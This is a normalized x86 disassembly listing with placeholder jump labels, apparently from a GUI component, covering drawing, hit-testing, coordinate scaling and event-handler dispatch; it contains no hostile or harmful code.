mov eax [ esi + 0x358 ]
call sub_403344
mov eax [ esi + 0x360 ]
call sub_403344
mov eax [ esi + 0x364 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4838f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_488598
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax edi
call sub_404094
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebx + 0x364 ]
call sub_48af6c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4885d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x364 ]
call sub_48a23c
cmp [ ebx + 0x3fa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
push edi
mov eax [ ebx + 0x364 ]
mov cl [ eax + 0x64 ]
mov edx ebx
mov eax [ ebx + 0x3fc ]
call [ ebx + 0x3f8 ]
sub_488620
mov cl [ eax + 0x4 ]
mov [ edx ] cl
mov cl [ eax + 0x6 ]
mov [ edx + 0x1 ] cl
mov cl [ eax + 0x5 ]
mov [ edx + 0x2 ] cl
mov ecx [ eax + 0x18 ]
mov [ edx + 0x3 ] ecx
mov ecx [ eax + 0x1c ]
mov [ edx + 0x7 ] ecx
mov ecx [ eax + 0x10 ]
mov [ edx + 0xb ] ecx
mov ecx [ eax + 0x14 ]
mov [ edx + 0xf ] ecx
retn
sub_48864c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2f0 ]
call sub_488620
lea edx [ esi + 0x39 ]
mov eax [ ebx + 0x2f4 ]
call sub_488620
lea edx [ esi + 0x13 ]
mov eax [ ebx + 0x2f8 ]
call sub_488620
lea edx [ esi + 0x26 ]
mov eax [ ebx + 0x2fc ]
call sub_488620
pop esi
pop ebx
retn
sub_48868c
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ esi ]
mov eax ebx
call sub_47c4a0
mov dl [ esi + 0x1 ]
mov eax ebx
call sub_47c4cc
mov dl [ esi + 0x2 ]
mov eax ebx
call sub_47c4fc
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push [ esi + 0x7 ]
push [ esi + 0x3 ]
push [ esi + 0xf ]
push [ esi + 0xb ]
mov eax ebx
call sub_47c9f0
sub_4886cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2f0 ]
call sub_48868c
lea edx [ esi + 0x39 ]
mov eax [ ebx + 0x2f4 ]
call sub_48868c
lea edx [ esi + 0x13 ]
mov eax [ ebx + 0x2f8 ]
call sub_48868c
lea edx [ esi + 0x26 ]
mov eax [ ebx + 0x2fc ]
call sub_48868c
pop esi
pop ebx
retn
sub_488748
push ebx
mov ebx eax
mov eax [ ebx + 0x354 ]
call sub_487b60
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax [ ebx + 0x354 ]
mov eax [ eax + 0x8 ]
xor edx edx
call sub_41dae4
sub_488774
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] cl
mov esi edx
mov ebx eax
mov eax ebx
call sub_484c5c
mov edi eax
dec edi
test edi edi
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc edi
xor ebp ebp
mov al 0x1
cmp esi [ ebx + 0x70 ]
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_48873c
cmp esi eax
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec edi
jne r-xdata
cmp esi [ ebx + 0x70 ]
je r-xdata
mov edx ebp
mov eax ebx
call sub_483fd0
mov eax [ eax + 0x34 ]
mov [ esp + 0x4 ] eax
cmp esi [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_48873c
cmp esi eax
jne r-xdata
sub_488804
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x3b8 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x35c ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov dl 0x1
call sub_487f00
pop ebp
retn
mov edx [ ebp + 0x8 ]
xor edx edx
call sub_487f00
sub_488844
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x364 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
push ebp
call sub_488804
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
call sub_483500
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x364 ]
call sub_48a534
test al al
je r-xdata
push ebp
call sub_488804
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x364 ]
mov edx [ eax ]
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x364 ]
mov edx [ eax ]
call [ edx + 0x10 ]
push ebp
call sub_488804
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ecx
pop ebp
retn
sub_4888f8
xor ecx ecx
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax ecx
retn
cmp [ eax + 0x300 ] 0x0
je r-xdata
cmp edx [ eax + 0x2f8 ]
jne r-xdata
cmp edx [ eax + 0x2f4 ]
jne r-xdata
mov eax [ eax + 0x360 ]
mov ecx [ eax + 0x14 ]
jmp r-xdata
mov eax [ eax + 0x358 ]
mov ecx [ eax + 0x14 ]
sub_488934
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ ebx + 0x10 ]
call sub_472e8c
mov eax [ ebx + 0x8 ]
call sub_4879c4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
xor edx edx
call sub_41d99c
cmp [ ebx + 0x4 ] 0x20000000
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_41d994
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
call sub_41d99c
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
call sub_41d9c0
push eax
mov eax [ ebx + 0x8 ]
call sub_41dadc
mov ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x4 ]
call sub_477924
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41dadc
test al al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
mov dl 0x1
call sub_41dae4
sub_4889e4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x354 ]
call sub_488934
pop ecx
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x354 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x28e
mov edx [ eax + 0x8 ]
inc edx
push edx
mov edx [ eax + 0xc ]
inc edx
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x288 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x300 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x350 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x300 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push esi
lea esi [ eax + 0x28e ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ esi + 0x10 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov ebx [ esi + 0x14 ]
mov ebx [ esi + 0x14 ]
neg ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x360 ]
call sub_488934
pop ecx
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x360 ]
mov eax [ ebp - 0x4 ]
lea ebx [ eax + 0x28e ]
mov edi [ esi + 0x14 ]
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x280 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4783f8
push 0xffffffff
push 0x0
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
mov eax [ ebp - 0x4 ]
lea ebx [ eax + 0x28e ]
mov eax [ ebx + 0xc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebx + 0x8 ]
mov edx [ ebx + 0x4 ]
dec edx
mov eax [ ebx ]
inc eax
call sub_412f04
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x280 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edi [ eax + 0x28e ]
mov eax [ edi + 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ edi + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x280 ]
push ebx
mov eax esi
call sub_487b0c
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov edx [ edi ]
sub edx eax
mov ecx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0xc ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
inc eax
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2f4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0xc ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov eax esi
call sub_487b0c
push eax
mov edx [ ebx ]
sub edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx [ ebx ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x0
jle r-xdata
inc ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x358 ]
call sub_488934
pop ecx
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x358 ]
mov eax [ ebp - 0x4 ]
lea esi [ eax + 0x28e ]
mov ebx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
mov eax [ esi + 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ecx ebx
mov ebx [ eax ]
call [ ebx + 0x110 ]
push ebx
add ebx [ edi + 0x14 ]
push ebx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov eax edi
call sub_487b0c
push eax
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
sub_488cdc
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fsub [ eax + 0x18 ]
fdiv [ rw-data ]
fadd [ eax + 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
fld [ eax + 0x10 ]
fsub [ ebp + 0x8 ]
fdiv [ rw-data ]
fsubr [ eax + 0x10 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_47c9f0
pop ebp
retn 0x10
sub_488d14
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x368 ] 0x0
je r-xdata
cmp [ ebx + 0x2b4 ] 0x0
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax ebx
call sub_48864c
lea esi [ ebp - 0x4c ]
lea edi [ ebx + 0x369 ]
mov ecx 0x13
[ edi ] [ esi ]
mov [ ebx + 0x368 ] 0x0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
mov eax [ ebx + 0x2f8 ]
call sub_47c9f0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebx + 0x2fc ]
call sub_47c9f0
push [ ebp + 0x44 ]
push [ ebp + 0x40 ]
push [ ebp + 0x3c ]
push [ ebp + 0x38 ]
mov eax [ ebx + 0x2f0 ]
call sub_47c9f0
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
mov eax [ ebx + 0x2f4 ]
call sub_47c9f0
mov [ ebx + 0x2c4 ] 0x1
cmp [ ebx + 0x2e2 ] 0x0
je r-xdata
mov esi [ ebx + 0x2b0 ]
dec esi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x40
mov edx ebx
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
mov eax [ ebx + 0x2f8 ]
call sub_488cdc
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebx + 0x2fc ]
call sub_488cdc
push [ ebp + 0x44 ]
push [ ebp + 0x40 ]
push [ ebp + 0x3c ]
push [ ebp + 0x38 ]
mov eax [ ebx + 0x2f0 ]
call sub_488cdc
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
mov eax [ ebx + 0x2f4 ]
call sub_488cdc
mov eax ebx
call sub_442a8c
dec esi
jne r-xdata
sub_488e48
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_47d2a4
test al al
je r-xdata
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov [ edx ] 0x2
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov [ edx + 0x9 ] ebx
sub_488e7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax + 0x1 ] 0xffffffff
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x5 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x9 ] edx
mov eax esi
call sub_484c5c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x348 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax esi
call sub_483fd0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x3b8 ]
call sub_487df4
test al al
je r-xdata
inc edi
xor ebx ebx
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xf4 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x1 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x35c ]
call sub_487df4
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_483fd0
mov edx [ ebp - 0xc ]
mov [ edx + 0x5 ] eax
mov eax [ ebp - 0xc ]
mov [ eax ] 0x3
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea eax [ esi + 0x28e ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x5
jmp r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x348 ]
call sub_4143bc
call sub_488e48
pop ecx
test al al
jne r-xdata
mov ebx [ esi + 0x364 ]
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ esi + 0x2e8 ]
call sub_483500
test eax eax
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_48b060
mov edi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x1 ] edi
mov eax [ ebp - 0xc ]
inc edi
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x6
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
sub_488fe4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2b5 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2b6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x5 ]
cmp al [ rw-data ]
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x5 ]
cmp al [ rw-data ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x6 ]
not eax
and al [ rw-data ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x6 ]
not eax
and al [ rw-data ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_44275c
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x284 ]
call sub_478894
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_477e28
mov eax [ ebp + 0x8 ]
mov [ eax - 0x7 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_44275c
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_478894
mov eax [ ebp + 0x8 ]
mov [ eax - 0x7 ] 0x1
sub_4890b0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x3d2 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x28d ] 0x1
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x6 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x5 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x3d4 ]
call [ ebx + 0x3d0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x28d ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x7 ] al
sub_48911c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_443b64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28d ] 0x0
je r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_412edc
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_488e7c
mov [ ebp - 0x7 ] 0x0
mov al [ ebp - 0x14 ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3da ] 0x0
je r-xdata
dec al
je r-xdata
cmp [ ebp - 0x7 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x1
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3dc ]
call [ ebx + 0x3d8 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28d ]
mov [ ebp - 0x7 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3ca ] 0x0
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x0
push ebp
call sub_4890b0
pop ecx
cmp [ ebp - 0x7 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x1
mov al [ ebp - 0x5 ]
push eax
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xb ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3cc ]
call [ ebx + 0x3c8 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28d ]
mov [ ebp - 0x7 ] al
mov al [ ebp - 0x5 ]
push eax
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x13 ]
mov ebx [ ebp - 0xf ]
mov edx ebx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x11c ]
mov [ ebp - 0x7 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3e2 ] 0x0
je r-xdata
sub al 0x3
je r-xdata
push ebp
call sub_488fe4
pop ecx
jmp r-xdata
cmp [ ebp - 0x7 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28d ] 0x1
mov eax [ ebp - 0x13 ]
push eax
mov al [ ebp - 0x5 ]
push eax
mov al [ ebp - 0x6 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xf ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3e4 ]
call [ ebx + 0x3e0 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28d ]
mov [ ebp - 0x7 ] al
push ebp
call sub_4890b0
pop ecx
cmp [ ebp - 0x7 ] 0x0
jne r-xdata
jmp r-xdata
push ebp
call sub_488fe4
pop ecx
jmp r-xdata
push ebp
call sub_488fe4
pop ecx
sub_48931c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b578
fstp [ ebp - 0x24 ]
fwait
mov edx edi
mov eax ebx
call sub_47b578
fsubr [ ebp - 0x24 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x18 ]
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebx + 0x10 ]
fadd [ ebp - 0x8 ]
fstp [ ebp - 0x18 ]
fwait
mov [ ebp - 0x19 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x3c2 ] 0x0
je r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ esi + 0x3c4 ]
call [ esi + 0x3c0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov eax ebx
call sub_47c9f0
sub_4893b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_484c5c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_484c5c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_483fd0
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x8 ]
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x9 ]
mov edi [ eax ]
call [ edi + 0x118 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_483fd0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xf4 ]
inc eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ eax + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44275c
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_489478
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
